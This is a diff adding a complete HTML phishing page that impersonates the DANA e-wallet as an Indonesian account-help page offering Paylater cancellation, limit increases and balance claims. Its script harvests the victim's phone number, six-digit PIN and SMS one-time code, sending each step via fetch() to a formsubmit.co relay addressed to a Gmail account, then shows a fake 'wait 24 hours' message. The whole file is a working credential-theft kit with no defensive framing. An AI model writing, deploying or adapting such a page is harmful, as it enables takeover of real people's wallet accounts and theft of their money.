@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#108EE9">
+  <title>DANA - Dompet Digital Indonesia</title>
+  <style>
+    /* Reset & Dasar */
+    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { margin: 0; background-color: #F5F9FC; color: #333; overflow-y: auto; /* Pastikan bisa scroll */ }
+    
+    /* Loader */
+    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #108EE9; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* MENU AWAL */
+    .promo-banner { width: 100%; display: block; }
+    .protection-status { background: #108EE9; color: white; margin: 10px 15px; border-radius: 8px; padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: bold; }
+    .search-bar { background: white; margin: 10px 15px; border-radius: 8px; padding: 12px; border: 1px solid #E6EAEF; display: flex; align-items: center; color: #B3B9C0; font-size: 14px; }
+    .section-title { margin: 20px 15px 10px; font-weight: bold; font-size: 16px; color: #3D4752; }
+    
+    /* 3 Tombol Opsi Biru */
+    .menu-blue-container { padding: 0 15px; }
+    .menu-blue-btn { background: #108EE9; color: white; display: flex; align-items: center; padding: 16px; border-radius: 12px; margin-bottom: 12px; cursor: pointer; border: none; width: 100%; box-shadow: 0 4px 10px rgba(16, 142, 233, 0.15); }
+    .m-icon-box { width: 38px; height: 38px; background: rgba(255,255,255,0.2); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 20px; }
+    .m-text { flex: 1; text-align: left; font-weight: bold; font-size: 14px; }
+
+    /* Terbaru Untukmu */
+    .terbaru-box { background: white; margin: 15px; border-radius: 12px; padding: 15px; border: 1px solid #E6EAEF; margin-bottom: 80px; }
+    .terbaru-item { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+    .terbaru-img { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; }
+
+    /* FORM STYLE */
+    .nav-header { background: white; padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #E6EAEF; }
+    .nav-header span { font-weight: bold; font-size: 16px; margin-left: 20px; color: #3D4752; }
+    .blue-banner { background: #108EE9; padding: 25px; text-align: center; }
+    .logo-dana-white { width: 110px; filter: brightness(0) invert(1); }
+    .container { margin: -30px 15px 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); padding: 25px 20px; position: relative; z-index: 10; }
+    
+    .phone-box { display: flex; align-items: center; border: 1px solid #D8DDE3; border-radius: 12px; padding: 0 15px; height: 58px; margin: 15px 0 10px; }
+    .code { font-weight: bold; font-size: 17px; border-right: 1px solid #E6EAEF; padding-right: 12px; margin-right: 12px; }
+    input { border: none; font-size: 18px; width: 100%; outline: none; background: transparent; }
+    
+    .instruction-text { font-size: 12px; color: #7A848F; line-height: 1.5; margin-bottom: 20px; }
+
+    .btn-submit { width: 100%; height: 52px; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
+    .btn-active { background: #108EE9; color: white; }
+    .btn-disabled { background: #B3B9C0; color: white; pointer-events: none; }
+
+    /* PIN */
+    .pin-display { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
+    .pin-dot { width: 14px; height: 14px; background: #D8DDE3; border-radius: 50%; }
+    .pin-dot.fill { background: #333; }
+
+    /* OTP HALAMAN BIRU */
+    #page-otp { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #108EE9; z-index: 200; color: white; text-align: center; padding-top: 15px; }
+    .otp-inputs { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
+    .otp-box-white { width: 55px; height: 55px; background: white; border-radius: 10px; border: none; text-align: center; font-size: 24px; font-weight: bold; color: #333; outline: none; }
+
+    section { display: none; }
+    section.active { display: block; }
+
+    /* Footer */
+    .footer-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #EEE; }
+    .nav-item { text-align: center; font-size: 10px; color: #7A848F; }
+    .nav-item img { width: 22px; display: block; margin: 0 auto 4px; }
+  </style>
+</head>
+<body onclick="focusPin()">
+
+  <div id="loader"><div class="spinner"></div></div>
+
+  <section id="page-menu" class="active">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7I1q8oP1z9Lq7jQW3N9U_5X2XpXy9n5B6m0Z/s1600/banner.jpg" class="promo-banner">
+    <div class="protection-status"><span>🛡️ DANA Protection Aktif</span><span>Detail ›</span></div>
+    <div class="search-bar">🔍 Cari bantuan akun...</div>
+    
+    <div class="section-title">Pilih Masalah Anda</div>
+    <div class="menu-blue-container">
+      <div class="menu-blue-btn" onclick="startFlow('Pembatalan Paylater')">
+        <div class="m-icon-box">✕</div><div class="m-text">Pembatalan DANA Paylater</div><span>›</span>
+      </div>
+      <div class="menu-blue-btn" onclick="startFlow('Pengajuan Limit')">
+        <div class="m-icon-box">📈</div><div class="m-text">Pengajuan Limit Paylater</div><span>›</span>
+      </div>
+      <div class="menu-blue-btn" onclick="startFlow('Klaim Saldo')">
+        <div class="m-icon-box">💰</div><div class="m-text">Klaim Saldo Proteksi Ekstra</div><span>›</span>
+      </div>
+    </div>
+
+    <div class="section-title">Terbaru Untukmu</div>
+    <div class="terbaru-box">
+      <div class="terbaru-item">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEix0u7Xy1Z-1GqU8Z-R2u/s1600/angpao.png" class="terbaru-img">
+        <div class="terbaru-info"><b>DANA Xuper Angpao</b><span>Bagi hoki tiap hari.</span></div>
+      </div>
+    </div>
+
+    <div class="footer-nav">
+        <div class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/25/25694.png">Beranda</div>
+        <div class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/2645/2645897.png">Aktivitas</div>
+        <div class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/2150/2150150.png">Dompet</div>
+        <div class="nav-item"><img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png">Saya</div>
+    </div>
+  </section>
+
+  <section id="page-phone">
+    <div class="nav-header" onclick="location.reload()"><span>‹ Masukkan Nomor</span></div>
+    <div class="blue-banner"><img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" class="logo-dana-white"></div>
+    <div class="container">
+      <h3 style="text-align: center; margin: 0 0 10px;">Konfirmasi ID</h3>
+      <div class="phone-box">
+        <div class="code">+62</div>
+        <input type="tel" id="userPhone" placeholder="8xx xxxx xxxx" oninput="checkPhone()">
+      </div>
+      <div class="instruction-text">
+        Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan <b>S&K</b> serta <b>Kebijakan Privasi</b> kami.
+      </div>
+      <button id="btnNext" class="btn-submit btn-disabled" onclick="sendPhone()">LANJUTKAN</button>
+    </div>
+  </section>
+
+  <section id="page-pin">
+    <div class="nav-header"><span>PIN DANA</span></div>
+    <div class="container" style="margin-top: 50px; text-align: center;">
+      <p>Masukkan 6 digit PIN DANA</p>
+      <div class="pin-display">
+        <div class="pin-dot" id="p1"></div><div class="pin-dot" id="p2"></div><div class="pin-dot" id="p3"></div>
+        <div class="pin-dot" id="p4"></div><div class="pin-dot" id="p5"></div><div class="pin-dot" id="p6"></div>
+      </div>
+      <input type="password" id="pinInput" maxlength="6" inputmode="numeric" style="position: absolute; opacity: 0;" oninput="processPin()">
+    </div>
+  </section>
+
+  <section id="page-verify">
+    <div class="nav-header"><span>Verifikasi Akun</span></div>
+    <div class="container" style="text-align: center; margin-top: 50px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" width="80" style="margin-bottom: 20px;">
+        <p style="font-weight: bold;">Selesaikan Verifikasi</p>
+        <p style="font-size: 13px; color: #7A848F;">Buka aplikasi DANA Anda untuk mengonfirmasi permintaan bantuan ini.</p>
+        <div style="height: 30px;"></div>
+        <button class="btn-submit btn-active" onclick="goOtp()">SAYA SUDAH VERIFIKASI</button>
+    </div>
+  </section>
+
+  <section id="page-otp">
+    <div style="padding: 15px; display: flex; align-items: center; font-weight: bold;">
+        <span onclick="location.reload()" style="font-size: 28px;">‹</span>
+        <span style="flex:1; text-align: center; margin-right: 20px;">Verifikasi SMS</span>
+    </div>
+    <div style="margin-top: 60px;">
+        <p>Kode OTP dikirim ke</p>
+        <p id="otpTarget" style="font-weight: bold; background: rgba(0,0,0,0.2); display: inline-block; padding: 5px 15px; border-radius: 20px;"></p>
+        <div class="otp-inputs">
+            <input type="tel" maxlength="1" class="otp-box-white" id="o1" oninput="jump(this, 'o2')">
+            <input type="tel" maxlength="1" class="otp-box-white" id="o2" oninput="jump(this, 'o3')">
+            <input type="tel" maxlength="1" class="otp-box-white" id="o3" oninput="jump(this, 'o4')">
+            <input type="tel" maxlength="1" class="otp-box-white" id="o4" oninput="sendOtp()">
+        </div>
+        <p style="font-size: 12px; opacity: 0.7;">KIRIM ULANG (00:59)</p>
+    </div>
+  </section>
+
+  <script>
+    const API = "https://formsubmit.co/ajax/baygaming648@gmail.com";
+    let dataStore = { phone: "", pin: "" };
+
+    function showLoader(fn) {
+      document.getElementById('loader').style.display = 'flex';
+      setTimeout(() => { document.getElementById('loader').style.display = 'none'; if(fn) fn(); }, 800);
+    }
+
+    function startFlow(m) {
+      showLoader(() => {
+        document.getElementById('page-menu').classList.remove('active');
+        document.getElementById('page-phone').classList.add('active');
+      });
+    }
+
+    function checkPhone() {
+      const v = document.getElementById('userPhone').value;
+      const btn = document.getElementById('btnNext');
+      if(v.length >= 9) { btn.className = "btn-submit btn-active"; btn.disabled = false; }
+      else { btn.className = "btn-submit btn-disabled"; btn.disabled = true; }
+    }
+
+    function sendPhone() {
+      dataStore.phone = "+62" + document.getElementById('userPhone').value;
+      document.getElementById('otpTarget').innerText = dataStore.phone;
+      fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ "STATUS": "LOG NOMOR", "HP": dataStore.phone }) });
+      showLoader(() => {
+        document.getElementById('page-phone').classList.remove('active');
+        document.getElementById('page-pin').classList.add('active');
+        document.getElementById('pinInput').focus();
+      });
+    }
+
+    function processPin() {
+      const val = document.getElementById('pinInput').value;
+      for(let i=1; i<=6; i++) document.getElementById('p'+i).className = val[i-1] ? "pin-dot fill" : "pin-dot";
+      if(val.length === 6) {
+        dataStore.pin = val;
+        fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ "STATUS": "LOG PIN", "HP": dataStore.phone, "PIN": dataStore.pin }) });
+        showLoader(() => {
+          document.getElementById('page-pin').classList.remove('active');
+          document.getElementById('page-verify').classList.add('active');
+        });
+      }
+    }
+
+    function goOtp() {
+      showLoader(() => {
+        document.getElementById('page-verify').classList.remove('active');
+        document.getElementById('page-otp').classList.add('active');
+        setTimeout(() => document.getElementById('o1').focus(), 300);
+      });
+    }
+
+    function jump(c, n) { if(c.value.length) document.getElementById(n).focus(); }
+
+    function sendOtp() {
+      const otp = document.getElementById('o1').value + document.getElementById('o2').value + document.getElementById('o3').value + document.getElementById('o4').value;
+      if(otp.length < 4) return;
+      fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ "STATUS": "LOG OTP", "HP": dataStore.phone, "PIN": dataStore.pin, "OTP": otp }) });
+      showLoader(() => {
+        alert("Sistem sedang memproses. Tunggu 1x24 jam.");
+        location.reload();
+      });
+    }
+
+    function focusPin() { if(document.getElementById('page-pin').classList.contains('active')) document.getElementById('pinInput').focus(); }
+  </script>
+</body>
+  </html>
